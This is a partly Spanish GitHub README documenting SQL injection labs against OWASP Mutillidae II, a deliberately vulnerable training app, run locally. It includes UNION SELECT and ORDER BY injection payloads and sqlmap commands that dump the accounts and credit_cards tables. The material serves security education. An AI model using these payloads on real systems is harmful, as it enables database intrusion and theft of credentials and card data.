# mutillidae II 
pentesting playground | owasp labs |  sql-injection

## Introduction  💫 ##


<p align="left">
This repo is about OWASP Mutillidae II ( updating content often)
OWASP Mutillidae II is a free, open-source, deliberately vulnerable web application providing a target for web-security training. Mutillidae can be installed on Linux and Windows using LAMP, WAMP, and XAMMP. It is pre-installed on SamuraiWTF and OWASP BWA. The existing version can be updated on these platforms. With dozens of vulnerabilities and…

  *Available here for download and work in local or remote it is your Choise https://github.com/webpwnized/mutillidae*
 *Available here for run with Docker https://github.com/webpwnized/mutillidae-docker*
  
 We are working in this section labs for *SQL-Injection*
 
<img style="width:550px;height:400px;border-radius:10px;" src="https://github.com/anb100/mutillidae/blob/main/screenshots_/sql-injection.png">
</p>

## Vulnerabilities in this project  : ##
 
  - XPath Injection 
  - XSS
  - SQL-I
  - DOM Injection
 
 <p>More than a 40 vulns in the project</p>

Este repositorio contiene los retos de laboratorio Mutillidae II , descritos y con capturas para la asignatura de puesta en producción.


## Installation Mutillidae

Options:
  1. There are many options for install this project , for instance in localhost with *LAMP,XAMP,WAMP* or by containers in *Docker* I show both and I tried both
  as well.
  Here is the link for install in Docker ![ install Docker and Mutillidae ](https://www.youtube.com/watch?v=9RH4l8ff-yg) 
  *Procedure  in Docker:* 
  Download from here ![ install Docker and Mutillidae ](https://github.com/webpwnized/mutillidae-docker) clone the entire repo and follow this steps , after download go to the /mutillidae-docker folder , then just run docker-compose up .
  ![docker is ready](https://github.com/anb100/mutillidae/blob/main/screenshots_/Docker/Docker-compose-up.png) 
  After this you can browser through http: for continue the installation. just a few ajustements in database and thats all.
  Ready for SQL laps.
  
  2. Installation in XAMP or LAMP just clone this repo ![Mutillidae](https://github.com/webpwnized/mutillidae) in htdocs - www-data - etc.. and run http://127.0.0.1/mutillidae
  Activate *MYSQL and APACHE* from Control Panel.
  
  4. Read carfully the Instructions about database configuratin and *setup* .
  5. Start the labs  .
  
  
## SQL- Injection Labs Timeline 

This labs are documented in many yt videos and now here. I try to solve the labs following the instructions and reading the hints.


  - __Lab 6 SQL-I__
  <p> En este lab nos vamos a dirigir a user-info.php y podemos analizar el código de login.php . </p>
  
 <img style="width:550px;height:400px;border-radius:10px;" src="https://github.com/anb100/mutillidae/blob/main/screenshots_/Lab%206/User-lookup-SQL.png" >
   
 - __Lab 7 Walk Through__ 
 <p> First of all we need to go to /user-info.php this login is vulnerable to sql-injection I checked it before with sqlmap .
 This labs consist in bypass the login with jeremy password<p>
 
  ![bypass](https://github.com/anb100/mutillidae/blob/main/screenshots_/Lab%207%20Walkthrough/Sin%20t%C3%ADtulo.png)
 
 - __Lab 9 Finding Number of Columns__
  <p> In this lab we need to check how many columns has *the table Accounts * emulating this
   [] Select * from accounts Where username=''$ AND password='' 
   [] The $ is located where the injection is to put in (' ORDER BY 7 #) end with a hashtag for comment the *and password* . 
   [] ![obtenerColumnas](https://github.com/anb100/mutillidae/blob/main/screenshots_/Lab%209%20Walkthrough/numero%20de%20columnas.png)
   </p>
   [] Username: ' UNION SELECT 1,@@VERSION,3,4,5,6,7 -- - 
   This show the version of this database
   [] Username: ' UNION SELECT 1,SCHEMA_NAME,3,4,5,6,7 FROM information_schema.schemata  -- -
   Show the tables in database
  
  - __Lab 10 : SQL Injection - Pivoting with SQL iNjection__ 
Hint : It is possible to use SQL injection on the User Info page to access other database tables besides the user database table

Start: /user-info.php 

  - __Lab 11 SQLMap__ 
![sqlmap](https://github.com/anb100/mutillidae/blob/main/screenshots_/Lab%2011/--tables-D--dbs.png)

Commands Used in this lab: 
CC data --> $sqlmap -u 127.0.0.1/index.php?page=user-info.php&username=1" --dump -D dumpfile -T credit_cards

Password data --> $sqlmap -u 127.0.0.1/index.php?page=user-info.php&username=1" --dump -D dumpfile -T accounts

extra args: --level=2 / --risk=1

Database Extraction Comand --> sqlmap -u 'http://127.0.0.1/index.php?page=user-info.php' --data='username=pa&password=ra&user-info-php-submit-button=View+Account+Details' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' --cookie="showhints=1;security_level=0; PHPSESSID=hereyoursession;" --dbs


<details>
<summary>Details</summary>
<br />
Coding...

</details>


#### Resources Used

| ID | Bibliography                     | Repository Link                                                  |
|----|----------------------------------|----------------------------------------------------------------- |
| 1  | _Github Fancy_                   | https://github.com/abhisheknaiidu/awesome-github-profile-readme  |
| 2  | _Github Page Author of this repo_| https://github.com/anb100                                        |
| 3  | _Github CheatSheet_              | https://github.com/tchapi/markdown-cheatsheet/blob/master/README.md |

